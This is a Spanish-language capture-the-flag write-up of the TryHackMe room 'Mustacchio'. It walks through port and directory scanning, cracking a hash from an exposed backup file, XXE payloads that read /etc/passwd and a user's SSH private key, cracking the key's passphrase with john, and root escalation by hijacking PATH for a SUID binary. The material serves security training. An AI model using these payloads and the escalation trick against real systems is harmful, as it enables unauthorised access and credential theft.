---
title: Mustacchio- Tryhackme
date: 2021-09-04
categories: [Write up, Linux, Tryhackme]
tags: [xxe, easy]     # TAG names should always be lowercase
---

#### RECONOCIMIENTO
- Usamos ```-sS --min-rate 5000 ``` para ir mucho mas rapido con el escaneo, luego lo guardaremos en el archivo allportsScan. Luego del escaneo se tendra el siguiente resultado.
- ``` Sie7e$ nmap -p- --open -sS --min-rate 5000 -Pn -vvv -oG allportsScan <<IP target>>```
    
    ```bash 
    # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
    Host: <IP target> ()    Status: Up
    Host: <IP target> ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8765/open/tcp//ultraseek-http///       Ignored State: filtered (65532)

    ```

- Luego de tener reconocido los puertos abiertos, vamos a escanear que servicios corren en dichos puertos

- ```Sie7e>$ nmap -p22,80,8765 -sC -sS -vvvv -oN servicesScan <IP target>```

    ```bash 
        Nmap scan report for <IP target>
        Host is up, received echo-reply ttl 63 (0.72s latency).
        Scanned at 2021-08-12 18:44:18 EDT for 16s

        PORT     STATE SERVICE        REASON
        22/tcp   open  ssh            syn-ack ttl 63
        | ssh-hostkey: 
        |   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
        |   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
        |   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
        80/tcp   open  http           syn-ack ttl 63
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        | http-robots.txt: 1 disallowed entry 
        |_/
        |_http-title: Mustacchio | Home
        8765/tcp open  ultraseek-http syn-ack ttl 63

        Read data files from: /usr/bin/../share/nmap
    ```

- En el puerto 22, no vemos nada interesante por lo que vamos a revisar los puertos 80 y 8765. Al ingresar al Firefox con estos puerto nos encontramos 

<center>
<a<img src="https://i.ibb.co/dWTw4VS/mustacchio-01.png" alt="mustacchio-01" border="0"></a>
</center>
- Ahora vamos a realizar fuzzing contra la pagina web, para enumerar directorios existentes
- ```Sie7e>$ wfuzz -c -f directoryWebScan,raw -w /usr/share/wordlists/dirb/common.txt --hc 404 -u http://<IP target>/FUZZ```

    ```bash
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://<IP target>/FUZZ
    Total requests: 4614

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                                                              
    =====================================================================

    000000001:   200        72 L     148 W      1752 Ch     "http://<IP target>/"                                                                                                
    000000011:   403        9 L      28 W       276 Ch      ".hta"                                                                                                               
    000000013:   403        9 L      28 W       276 Ch      ".htpasswd"                                                                                                          
    000000012:   403        9 L      28 W       276 Ch      ".htaccess"                                                                                                          
    000001121:   301        9 L      28 W       311 Ch      "custom"                                                                                                             
    000001648:   301        9 L      28 W       310 Ch      "fonts"                                                                                                              
    000001991:   301        9 L      28 W       311 Ch      "images"                                                                                                             
    000002020:   200        72 L     148 W      1752 Ch     "index.html"                                                                                                         
    000003436:   200        2 L      4 W        28 Ch       "robots.txt"                                                                                                         
    000003588:   403        9 L      28 W       276 Ch      "server-status"                                                                                                      

    Total time: 0
    Processed Requests: 4614
    Filtered Requests: 4604
    Requests/sec.: 0
    ```
### EXPLOTACION

- Encontramos algunas rutas en las cuales podemos husmear un poco, la que mas interesante es la ```/custom```
<center>
<a><img src="https://i.ibb.co/YjF0PR6/mustacchio-02.png" alt="mustacchio-02" border="0"></a>
</center>
Encontramos unos archivos, las cuales el mas interesante es ``users.bak``  asi que vamos a revisar de que se trata.
```bash
Sie7e>$ sqlitebrowser users.bak 
```
<center>
<a><img src="https://i.ibb.co/0QGVPyJ/mustacchio-03.jpg" alt="mustacchio-03" border="0"></a>
</center>

por lo que se tiene un hash, por lo que usaremos
<a href="https://crackstation.net/">CrackStation</a> para poner crack dicho hash. Tu podrias usar ``hascat `` o lo que gustes

<center>
<a><img src="https://i.ibb.co/ygFYPVy/mustacchio-04.png" alt="mustacchio-04"></a>
</center>

- Teniendo las credenciales, ahora podemos logearnos, en ``http://<IP target>:8765``
<center>
<a><img src="https://i.ibb.co/c6ymwHV/mustacchio-06.png" alt="mustacchio-06" border="0"></a>
</center> 

- Ingresamos y vemos un panel en la cual revisamos el codigo fuente
<center>
    <a href="https://i.ibb.co/FWL94Zq/mustacchio-06.png"><img src="https://i.ibb.co/FWL94Zq/mustacchio-06.png" alt="mustacchio-06" ></a>
</center>
Vemos que se podemos escribir, pero en formato xml y los parametros que se necesitan son `<comment>`,`<name>`,`<autor>`,`<com>`. Por otra parte vemos un comentario que nos indica un nombre de un usuario el cual es ``barry``

Entonces tendriamos la siguiente estructura de xml
```bash 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Sie7e</name>
  <author>Barry </author>
  <com>Esto es una prueba</com>
</comment>
```
podemos encontrar muchos payloads y hacerlo de filtrar informacion a nuestro gusto [xxe-injection-payloads-list](https://github.com/payloadbox/xxe-injection-payload-list),  yo lo hice de la siguiente forma:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Sie7e</name>
  <author>Barry </author>
  <com>&xxe;</com>
</comment>
```
<center>
<a href="https://ibb.co/z473CtW"><img src="https://i.ibb.co/jrWCqj9/mustacchio-07.jpg" alt="mustacchio-07" border="0"></a>
</center>
- Para ver la ssh del usuario de barry:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Sie7e</name>
  <author>Barry </author>
  <com>&xxe;</com>
</comment>
``` 
<center>
<a href="https://ibb.co/yYLshxY"><img src="https://i.ibb.co/ZYyTHbY/mustacchio-08.jpg" alt="mustacchio-08" border="0"></a>
</center>

-   Ya tendriamos la ssh de ``barry`` 

###  CRACKING IRSA	
- Tenemos la id_rsa, la cual nos permitira logearnos a travez de ssh
```bash
Sie7e>$ ssh -i id_rsa barry@<IP target>
Enter passphrase for key 'id_rsa': 
```
- Nos pide la contraseña del id_rsa mas no del usuario, entonces usaremos ssh2jhon.py para obtener el hash y luego crackear con john y obtener la contarseña
 ```bash
 Sie7e>$ python3 ssh2john.py id_rsa > hash
 ```
 - Ahora ya podemos usar john para crackear el hash y obtener la contraseña del archivo id_rsa
 ```bash
 Sie7e>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
********       (id_rsa)
1g 0:00:00:04 DONE (2021-06-12 03:34) 0.2277g/s 3266Kp/s 3266Kc/s 3266KC/s     1990..*7¡Vamos!
Session completed
 ```

### ESCALAR PRIVILEGIOS

- Ahora a logearnos por ssh

    ```bash
    Sie7e>$ ssh -i irsa barry@<IP target> 
    The authenticity of host <IP target> (<IP target>) cant be established.
    ECDSA key fingerprint is SHA256:ZZet5QyZ8Pn5+08sVBFZdDzP/6yZEQeNpRZEd5DLLks.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '<IP target>' (ECDSA) to the list of known hosts.
    Enter passphrase for key 'irsa': 
    Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    34 packages can be updated.
    16 of these updates are security updates.
    To see these additional updates run: apt list --upgradable



    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.

    barry@mustacchio:~$ ls
    user.txt
    ```

-   Ahora precedemos a [enumerar para escalar privilegios](https://byte-mind.net/enumeracion-y-escalado-de-privilegios-en-linux/), buscamos archivos con permisos de SIUD
    
    ```bash
    barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/snapd/snap-confine
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/bin/passwd
    /usr/bin/pkexec
    /usr/bin/chfn
    /usr/bin/newgrp
    /usr/bin/at
    /usr/bin/chsh
    /usr/bin/newgidmap
    /usr/bin/sudo
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /home/joe/live_log
    /bin/ping
    /bin/ping6
    /bin/umount
    /bin/mount
    /bin/fusermount
    /bin/su
    ```
- Un archivo nos llama la atención ``/home/joe/live_log``

```bash
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 .
drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log
barry@mustacchio:/home/joe$ strings live_log
.
.
.
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
.
.
.
```
- Al al hacer strings vemos algo que nos llama la atención, que se puede escalar privilegios a traves de un [privilege-escalation-using-path](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/). Llego a esta conclusion ya que este archivo lo ejecuta el usuario root, entonces si lograrmos secuestrar el PATH para que nuestro archivo ``tail`` se ejecute dandonos una shell con privilegios de administrador
- Vamos a crear una carpeta temporal para meter nuestro archivo tail
```bash
barry@mustacchio:/home/joe$ mktemp -d 
/tmp/tmp.ktizzoGj0O
barry@mustacchio:/home/joe$ cd /tmp/tmp.ktizzoGj0O
```
- Metemos el ``/bin/bash`` al archivo tail, para luego decirle que primero debe de buscar el archiuvo tail en nuestra ruta actual y le damos permiso de ejecución
```bash
barry@mustacchio:/tmp/tmp.ktizzoGj0O$ echo "/bin/bash" -i > tail 
barry@mustacchio:/tmp/tmp.ktizzoGj0O$ pwd
/tmp/tmp.ktizzoGj0O
barry@mustacchio:/tmp/tmp.ktizzoGj0O$ export PATH=/tmp/tmp.ktizzoGj0O:$PATH
barry@mustacchio:/tmp/tmp.ktizzoGj0O$ chmod +x tail
```
- Ahora simplemente lo ejecutamos
```bash
barry@mustacchio:/tmp/tmp.ktizzoGj0O$ cd
barry@mustacchio:~$ pwd
/home/barry
barry@mustacchio:~$ cd /home/joe
barry@mustacchio:/home/joe$ ./live_log
```
- EEEEEE ya somos root y tenemes nuestra flags
```bash
root@mustacchio:/home/joe# whoami
root
root@mustacchio:/home/joe# ls
live_log
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# ls
root.txt
```

- Si deseas aprender mas sobre este hermoso campo que es el hacking te recomiendo los materiales siguientes:
    - Canal de youtube de [S4vitar](https://www.youtube.com/c/s4vitar)
    - Payloads de todo tipo [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
    - Diccionarios para el descubrimiento de rutas [url paths](https://www.hackplayers.com/2018/01/diccionarios-para-el-descubrimiento-de-rutas.html) en aplicaciones webs
    - Ataques a [redes inalambricas](https://epasan.gitbooks.io/notas-de-seguridad-informatica-ofensiva/content/chapter9.html)
    - Si tienes algun permiso sobre un binario como root usa [GTFOBins](https://gtfobins.github.io/)
- Espero que esta informacion te ayude en tu camino 